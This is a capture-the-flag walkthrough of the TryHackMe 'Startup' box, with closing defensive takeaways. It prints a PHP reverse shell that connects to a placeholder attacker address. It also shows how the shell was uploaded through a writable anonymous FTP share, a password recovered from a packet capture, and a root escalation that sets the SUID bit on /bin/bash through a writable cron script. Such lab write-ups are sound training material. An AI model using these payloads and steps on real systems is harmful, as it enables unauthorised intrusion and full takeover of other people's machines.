Startup is an Easy Linux box from TryHackMe that chains three findings into a full compromise. Anonymous FTP exposes a world-writable directory that also happens to be published over HTTP, so a PHP reverse shell written over FTP can be triggered from the browser as `www-data`. A forgotten packet capture on the filesystem holds a recorded shell session whose typed `sudo` password belongs to the user `lennie`, and a root cron job runs a script that `lennie` can rewrite — turning that user into root.

A note on addressing: the target was reset partway through, so its IP changed. Every command below uses the address that was live for the rest of the engagement, `10.130.130.132`.

| Tool         | Description                                                             |
|--------------|-------------------------------------------------------------------------|
| nmap         | Network port scanner and service fingerprinter                          |
| ftp          | Anonymous login and upload of the webshell to the writable share        |
| gobuster     | Directory brute-forcer that tied the FTP share to a web path            |
| curl         | Triggered the uploaded webshell over HTTP                               |

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV -Pn -n 10.130.130.132 -oN nmap
```

```bash

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Three services, and nmap's FTP scripts have already done the most important work: **anonymous FTP is allowed**, and one of the directories in the share — `ftp` — is flagged **writeable**. A writable anonymous share is only half a foothold on its own; the other half is finding somewhere those files get executed.

### FTP — Anonymous Access

Logging in as `anonymous`/`ftp` confirms the layout, including a `notice.txt` that's pure flavour (an office complaint about "Among Us" memes) and the writable `ftp/` subdirectory:

```bash
ftp 10.130.130.132       # name: ftp,  password: <blank>
```

```bash
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

### Web Enumeration — The `/files/` Share

The website is a "Maintenance" placeholder, but a content scan finds a directory that changes everything:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.130.132/ -t 50
```

```bash
files                (Status: 301) [--> http://10.130.130.132/files/]
server-status        (Status: 403)
```

Browsing `/files/` shows the *same* `important.jpg` and `notice.txt` seen over FTP: **the FTP share is served over HTTP**. That is the whole foothold — the writable `ftp/` directory is reachable at `http://10.130.130.132/files/ftp/`, and since the site runs PHP, a script written there through FTP will execute when requested over the web.

## Initial Access — Webshell via the FTP-backed Share as `www-data`

The payload is a PHP file that fires a reverse shell the moment it's loaded — no `cmd` parameter needed, since we control the whole file:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
```

It goes up through FTP into the writable `ftp/` directory:

```bash
ftp> cd ftp
ftp> put shell.php
```

With a listener ready, requesting the file over HTTP executes it:

```bash
curl http://10.130.130.132/files/ftp/shell.php
```

```bash
nc -nlvp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.130.130.132 35260
www-data@startup:/var/www/html/files/ftp$
```

After the usual TTY upgrade, a look around shows one home directory, `lennie`, and a root-owned `/incidents/` folder holding a packet capture — an unusual thing to leave lying on a web server:

```bash
www-data@startup:/incidents$ ls -la
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

## Lateral Movement — `www-data` → `lennie`

### Exfiltrating the Capture

The capture can't be opened on the box, so it goes back the way the shell came in — copied into the web-reachable `ftp/` directory and pulled down with `wget`:

```bash
www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/ftp/
```

```bash
wget http://10.130.130.132/files/ftp/suspicious.pcapng
```

### Following the TCP Stream

Opened in Wireshark, the capture holds a recorded interactive session — someone else's shell on this host. **Follow TCP Stream** reassembles it into a readable transcript of everything they typed:

![Wireshark's Follow TCP Stream reconstructing a recorded shell session on the target](/assets/img/THM/Startup/cap1.png)

Partway through, the user runs a `sudo` command and types their password at the prompt — captured in cleartext because the session itself was plaintext:

![The reconstructed stream showing the user entering a sudo password, c4ntg3t3n0ughsp1c3](/assets/img/THM/Startup/cap2.png)

The password `c4ntg3t3n0ughsp1c3` is worth trying against the only real user on the box, `lennie`, and it's reused there:

```bash
www-data@startup:/incidents$ su lennie
Password:
lennie@startup:~$ cat user.txt
REDACTED
```

## Privilege Escalation — `lennie` → `root`

`lennie`'s home has a `scripts/` directory owned by `root`, containing a `planner.sh` and a `startup_list.txt` whose timestamp keeps updating — the signature of something running on a schedule:

```bash
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`planner.sh` is owned by root, but it *calls* `/etc/print.sh` — and that file is owned by `lennie`:

```bash
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

If a root cron job runs `planner.sh`, then whatever `/etc/print.sh` contains runs as root too — and `lennie` can write it. Appending a line that sets the SUID bit on `/bin/bash` and waiting for the job to fire does exactly that:

```bash
lennie@startup:~/scripts$ echo "chmod u+s /bin/bash" >> /etc/print.sh
lennie@startup:~/scripts$ watch -n 1 "ls -l /bin/bash"
```

```bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

Once `/bin/bash` is SUID-root, `bash -p` keeps that privilege instead of dropping it, and the box is done:

```bash
lennie@startup:~$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
REDACTED
```

## Key Takeaways

- **A writable share is dangerous the moment its files are executable somewhere.** FTP write access was harmless until `/files/` proved the same directory was served — and interpreted — by the web server. Upload-over-one-protocol, execute-over-another is a recurring pattern; the fix is keeping upload storage off any path a server will run code from.
- **Packet captures are credential stores.** A plaintext session recorded to disk replayed every keystroke, `sudo` password included. Sensitive artefacts like `.pcap` files left on a reachable filesystem are as good as a password file — and a reused password turned a forensic curiosity into a login.
- **Timestamps that keep changing mean something is running on a schedule.** `startup_list.txt` updating on its own was the tell for a cron job, without needing to read `/etc/crontab` — behaviour is often easier to observe than configuration.
- **A root job is only as trustworthy as every file it touches.** `planner.sh` was safely root-owned, but it sourced a `lennie`-writable script; the privilege of a scheduled task flows to *everything in its call chain*, and one writable link is enough.
- **The classic SUID-bash escalation needs `-p`.** Setting the SUID bit is half of it; `bash -p` is the other half, keeping the root effective UID that a normal shell launch would immediately drop.
